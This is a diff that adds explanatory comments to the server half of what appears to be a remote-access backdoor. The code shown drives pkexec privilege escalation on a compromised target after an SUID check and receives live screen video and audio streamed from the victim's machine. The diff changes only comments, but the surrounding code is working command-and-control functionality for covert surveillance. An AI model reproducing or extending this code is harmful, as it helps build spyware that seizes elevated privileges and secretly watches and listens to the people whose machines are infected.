@@ -122,24 +122,28 @@ class Server:
             self.target_socket.settimeout(None)
 
     # -------------------------------------------------------------------------
-    # Privilege Escalation (no banners)
+    # Privilege Escalation
     # -------------------------------------------------------------------------
     def _privilege_escalator(self, user):
         print(f"Escalating privileges of USER:{user} with pkexec...")
         osname = self._reliable_recv()
         print(f"OS NAME: {osname}")
+        # Check if the OS is POSIX (Linux/Unix-like)
         if osname == 'posix':
+            #wait for the target to check SUID has pkexec or not
             print('wait for SUID...')
             suid_msg = self._reliable_recv()
             print(f"Result from checking SUID: {suid_msg}")
+            # If SUID is found, start the escalation process
             if "Found" in suid_msg:
                 print("Starting Escalation")
                 while True:
+                    # wait for target to send AUTHENTICATE message 
                     chk = self._reliable_recv()
                     print(chk)
                     if chk == "AUTHENTICATED":
                         break
-                result = self._reliable_recv()
+                result = self._reliable_recv() # Escalation result
                 print(result)
             else:
                 print(self._reliable_recv())
@@ -260,22 +264,31 @@ class Server:
     # Screen streaming
     # -------------------------------------------------------------------------
     def _start_screen_stream(self):
+        #check if screen process is already running
         if self.screen_process and self.screen_process.is_alive():
             log.warning("Screen stream already running")
             return
+
+        # create a communication queue for communicate between the process    
         comm = multiprocessing.Queue()
+
+        #new process for screen streaming
         self.screen_process = multiprocessing.Process(
             target=screen_streamer_process,
             args=(self.host_ip, self.video_port, self.audio_port, comm)
         )
-        self.screen_process.start()
+
+        #start the process
+        self.screen_process.start() 
         try:
+            # wait for the process to send status
             status = comm.get(timeout=25)
         except queue.Empty:
             log.error("Stream status not received (timeout)")
             return
         log.success(status)
-
+    
+    #Stop the screen streaming process
     def _stop_screen_stream(self):
         if self.screen_process and self.screen_process.is_alive():
             self.screen_process.terminate()
@@ -310,7 +323,7 @@ class Server:
 # Screen streamer helpers
 # =============================================================================
 def receive_all(sock, n):
-    buf = b''
+    buf = b'' # Buffer to hold received data in byte string
     while n:
         chunk = sock.recv(n)
         if not chunk: return None
@@ -319,16 +332,18 @@ def receive_all(sock, n):
     return buf
 
 def video_stream_worker(vsock, q, evt):
-    client, addr = vsock.accept()
+    client, addr = vsock.accept() # Accept a video stream connection from backdoor
     log.info(f"Video from {addr}")
     evt.set()
     try:
         while True:
+            # loop to receive video frames
             hdr  = receive_all(client, struct.calcsize(">L"))
             if not hdr: break
             size = struct.unpack(">L", hdr)[0]
             data = receive_all(client, size)
             if not data: break
+            # Decode the received data into an image frame (JPEG to OpenCV image)
             frame = cv2.imdecode(np.frombuffer(data, dtype=np.uint8), cv2.IMREAD_COLOR)
             q.put(frame)
     finally:
@@ -336,10 +351,14 @@ def video_stream_worker(vsock, q, evt):
         log.warning("Video disconnected")
 
 def audio_stream_worker(asock, evt):
+    # Accept an audio stream connection from backdoor
     client, addr = asock.accept()
     log.info(f"Audio from {addr}")
+    # Set the event to indicate that audio streaming is ready
     evt.set()
+    # Initialize PyAudio for audio playback
     p = pyaudio.PyAudio()
+    # Open an audio stream for playback
     stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100,
                     output=True, frames_per_buffer=256)
     try:
@@ -357,7 +376,9 @@ def audio_stream_worker(asock, evt):
         p.terminate()
         log.warning("Audio disconnected")
 
+#live screen and audio streaming process
 def screen_streamer_process(host, vport, aport, status_q):
+    # Create sockets for video and audio streaming
     with socket.socket() as vsock, socket.socket() as asock:
         vsock.bind((host, vport)); vsock.listen(1)
         asock.bind((host, aport)); asock.listen(1)
